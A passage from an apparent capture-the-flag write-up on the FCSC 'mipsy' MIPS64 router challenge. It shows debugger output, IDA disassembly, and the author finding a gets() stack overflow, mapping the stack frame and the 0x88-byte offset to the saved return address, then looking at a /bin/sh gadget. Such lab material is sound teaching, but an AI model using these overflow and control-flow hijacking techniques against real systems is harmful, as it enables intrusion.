add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
'context': Print out the current register, instruction, and stack context.
Exception occurred: context: unsupported operand type(s) for +: 'NoneType' and 'int' (&lt;class 'TypeError'&gt;)
For more info invoke `set exception-verbose on` and rerun the command
or debug it by yourself with `set exception-debugger on`
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
       0x120000000        0x12002e000 r-xp    2e000 0      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
       0x12002e000        0x12003d000 ---p     f000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
       0x12003d000        0x120040000 r--p     3000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
       0x120040000        0x120043000 rw-p     3000 30000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
      0x4000403000       0x4000828000 r--p   425000 0      &lt;explored&gt;
      0x40007fe000       0x4000801000 rw-p     3000 0      [stack]

[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
pwndbg&gt; continue
Continuing.
warning: Could not load shared library symbols for 2 libraries, e.g. /lib/libc.so.6.
Use the &quot;info sharedlibrary&quot; command to see the complete listing.
Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?
[Inferior 1 (process 1) exited normally]
</code></pre><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
<pre tabindex="0"><code>+---------------------------------+
|/                               \|
|        ITSY MIPSY ROUTER        |
|\                               /|
+---------------------------------+

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] 
</code></pre><p>We&rsquo;re able to debug properly our process !</p>
<div class="gblog-post__anchorwrap">
    <h2 id="reverse-engineering">
        Reverse Engineering
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#reverse-engineering" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Reverse Engineering" href="#reverse-engineering">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>We can take a look at the binary by running the file command:</p>
<pre tabindex="0"><code>$ file mipsy                                                                  
mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamically linked, interpreter /lib64/ld.so.1, BuildID[sha1]=e20cf7872e96482095ce68e6d4d03806d5928de4, for GNU/Linux 3.2.0, not stripped
</code></pre><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
<pre tabindex="0"><code>+---------------------------------+
|/                               \|
|        ITSY MIPSY ROUTER        |
|\                               /|
+---------------------------------+

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 1
The router has the following network interfaces:
* lo
* eth0
* eth2
* eth1

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 2
Success: HTTP file server is up!

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 3
Input your password:
&gt;&gt;&gt; l3eT_p4sS
Error: wrong password.

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 0
</code></pre><p>It doesn&rsquo;t give any interesting informations so instead of fuzzing manually the binary to find the vulnerability, I reversed the main functions in IDA. And particulary the code of the the function corresponding to the &ldquo;Login as admin&rdquo; feature. The assembly code of this function looks like such:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="na">.globl</span> <span class="no">authenticate</span>
<span class="nl">authenticate:</span>

<span class="nf">var_40</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x40</span>
<span class="nf">var_18</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x18</span>
<span class="nf">var_10</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x10</span>
<span class="nf">ret_addr</span><span class="err">=</span> <span class="p">-</span><span class="mi">8</span>

<span class="nf">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="p">-</span><span class="mi">0x90</span>       <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">sd</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">ret_addr</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">sd</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">sd</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">move</span>    <span class="no">$fp</span><span class="p">,</span> <span class="no">$sp</span>
<span class="nf">lui</span>     <span class="no">$gp</span><span class="p">,</span> <span class="mi">4</span>           <span class="c">; Load Upper Immediate
</span><span class="c"></span><span class="no">daddu</span>   <span class="no">$gp</span><span class="p">,</span> <span class="no">$t9</span>         <span class="c">; Doubleword Add Unsigned
</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x3AA4</span>      <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aInputYourPassw</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;Input your password:&#34;
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">puts</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; puts       ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">asc_120025B00</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;&gt;&gt;&gt; &#34;
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">printf</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; printf     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">stdout</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">ld</span>      <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">stdout</span> <span class="p">-</span> <span class="mi">0x120042BC8</span><span class="p">)(</span><span class="no">$v0</span><span class="p">)</span>  <span class="c">; Load Doubleword
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; stream
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">fflush</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; fflush     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$fp</span>
<span class="nf">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">gets</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; gets       ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x50</span>   <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">li</span>      <span class="no">$a2</span><span class="p">,</span> <span class="mi">0x20</span>  <span class="c">; &#39; &#39;  ; n
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; c
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; s
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">memset</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; memset     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c">; s
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">strlen</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; strlen     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">daddiu</span>  <span class="no">$v1</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x50</span>   <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$v1</span>
<span class="nf">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$fp</span>
<span class="nf">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">kdf</span>         <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">bal</span>     <span class="no">kdf</span>              <span class="c">; Branch Always and Link
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">daddiu</span>  <span class="no">$v1</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x50</span>   <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">li</span>      <span class="no">$a2</span><span class="p">,</span> <span class="mi">0x20</span>  <span class="c">; &#39; &#39;  ; n
</span><span class="c"></span><span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$a1</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">unk_120025B08</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; s2
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; s1
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">memcmp</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; memcmp     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">bnez</span>    <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004688</span>  <span class="c">; Branch on Not Zero
</span></code></pre></div><p>When I began this challenge I didn&rsquo;t know anything about mips64 assembly but thanks to auto comments in IDA and to <a
  class="gblog-markdown__link"
  href="http://math-atlas.sourceforge.net/devel/assembly/mips-iv.pdf"
  
  >this</a
> and <a
  class="gblog-markdown__link"
  href="https://write.lain.faith/~/Haskal/mips-rop/"
  
  >this</a
>, I understood very quickly the main components of the architecture. And that&rsquo;s why I noticed a call to the <code>gets</code> function which as it&rsquo;s known read an arbitrary number of bytes from stdin to the buffer indicated in argument, and so in our case in <code>$fp</code>, which is initialized to <code>$sp-0x90</code>. Next the call to <code>gets</code>, <code>printf</code> and <code>fflush</code>, it calls <code>memset</code> to set every bytes of another buffer allocated next to our input to zero. Then it computes the length of our input and calls the <code>kdf</code> function with the following arguments: <code>kdf(char *input_password, int input_length, unsigned char *out)</code>. The kdf function is basically doing some encryption operations according to our input and its length and stores the result in the third argument.
And the result of this encryption routine is compared to a constant value with <code>memcmp</code>.</p>
<p>So we discovered the stack based buffer overflow which allows us to overwrite the saved instruction pointer saved at the functions&rsquo;s prologue.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Since we understood the vulnerable function, we can represent the stackframe like that:</p>
<pre tabindex="0"><code>$saved_fp-0x90+----------------------+
              |                      |
              |                      |
              |   buffer_password    |
              |                      |
              |                      |
$saved_fp-0x40+----------------------+
              |                      |
              |                      |
              |         out          |
              |                      |
$saved_fp-0x16+----------------------+
              |       saved_gp       |
$saved_fp-0x10+----------------------+
              |       saved_fp       |
   $saved_fp-8+----------------------+
              |       saved_ra       |
     $saved_fp+----------------------+
              |                      |
              |  calling function's  |
              |      stackframe      |
              |                      |
              |                      |
              +----------------------+
</code></pre><p>And so, according to this schema, we overwrite the saved <code>$ra</code> from a padding of <code>0x90-0x8=0x88</code> bytes.
But since we&rsquo;re able to jmp everywhere, we have to figure out what kind of technique we want to use.</p>
<div class="gblog-post__anchorwrap">
    <h4 id="one-gadget-">
        One gadget ?
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#one-gadget-" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor One gadget ?" href="#one-gadget-">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h4>
</div>
<p>For an obsure reason, I thought the <code>gets</code> function had for badchar the NULL byte, so I was looking for a one gadget in the binary.
I discovered during the reverse engineering part an interesting snippet of code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">.globl</span> <span class="no">ip</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ip</span><span class="p">:</span>                                      <span class="c">; CODE XREF: main+260↓p
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>                                          <span class="c">; DATA XREF: LOAD:0000000120002438↑o ...
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ret</span>             <span class="err">=</span> <span class="p">-</span><span class="mi">0x1050</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">n_read</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x104C</span> 
<span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span> <span class="no">fd</span>              <span class="err">=</span> <span class="p">-</span><span class="mi">0x1048</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_1044</span>        <span class="err">=</span> <span class="p">-</span><span class="mi">0x1044</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">buf</span>             <span class="err">=</span> <span class="p">-</span><span class="mi">0x1040</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ptr_binsh</span>       <span class="err">=</span> <span class="p">-</span><span class="mi">0x40</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">dash_c</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x38</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_30</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x30</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">null</span>            <span class="err">=</span> <span class="p">-</span><span class="mi">0x28</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_18</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x18</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_10</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x10</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_8</span>           <span class="err">=</span> <span class="p">-</span><span class="mi">8</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="p">-</span><span class="mi">0x1050</span>     <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC4</span>                 <span class="no">sd</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x1050</span><span class="err">+</span><span class="no">var_8</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC8</span>                 <span class="no">sd</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x1050</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FCC</span>                 <span class="no">sd</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x1050</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FD0</span>                 <span class="no">move</span>    <span class="no">$fp</span><span class="p">,</span> <span class="no">$sp</span>         <span class="c">; prologue
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FD4</span>                 <span class="no">lui</span>     <span class="no">$gp</span><span class="p">,</span> <span class="mi">4</span>           <span class="c">; Load Upper Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FD8</span>                 <span class="no">daddu</span>   <span class="no">$gp</span><span class="p">,</span> <span class="no">$t9</span>         <span class="c">; Doubleword Add Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FDC</span>                 <span class="no">daddiu</span>  <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x4060</span>      <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FE0</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FE4</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aBinSh</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;/bin/sh&#34;
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FE8</span>                 <span class="no">sd</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1010</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FEC</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FF0</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aC</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;-c&#34;
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FF4</span>                 <span class="no">sd</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1018</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FF8</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FFC</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aListInterfaces</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;./list_interfaces.sh&#34;
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004000</span>                 <span class="no">sd</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1020</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004004</span>                 <span class="no">sd</span>      <span class="no">$zero</span><span class="p">,</span> <span class="mi">0x1028</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004008</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">8</span>      <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000400</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; pipedes
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004010</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">pipe</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004014</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; pipe
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004018</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; pipe       ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000401</span><span class="no">C</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004020</span>                 <span class="no">move</span>    <span class="no">$v1</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; return value
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004024</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0xFFFFFFFFFFFFFFFF</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004028</span>                 <span class="no">bne</span>     <span class="no">$v1</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004070</span>  <span class="c">; Branch on Not Equal
</span><span class="c">; skip
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004070</span> <span class="no">loc_120004070</span><span class="p">:</span>                           <span class="c">; CODE XREF: ip+68↑j
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004070</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">fork</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004074</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fork
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004078</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; fork       ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000407</span><span class="no">C</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004080</span>                 <span class="no">sw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Store Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004084</span>                 <span class="no">lw</span>      <span class="no">$v1</span><span class="p">,</span> <span class="mi">0</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004088</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="p">-</span><span class="mi">1</span>          <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000408</span><span class="no">C</span>                 <span class="no">bne</span>     <span class="no">$v1</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_1200040D4</span>  <span class="c">; Branch on Not Equal
</span><span class="c">; skip
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">D4</span> <span class="no">loc_1200040D4</span><span class="p">:</span>                           <span class="c">; CODE XREF: ip+CC↑j
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">D4</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">D8</span>                 <span class="no">bnez</span>    <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004158</span>  <span class="c">; Branch on Not Zero
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">DC</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">E0</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0xC</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>    <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">E4</span>                 <span class="no">li</span>      <span class="no">$a1</span><span class="p">,</span> <span class="mi">1</span>           <span class="c">; fd2
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">E8</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fd
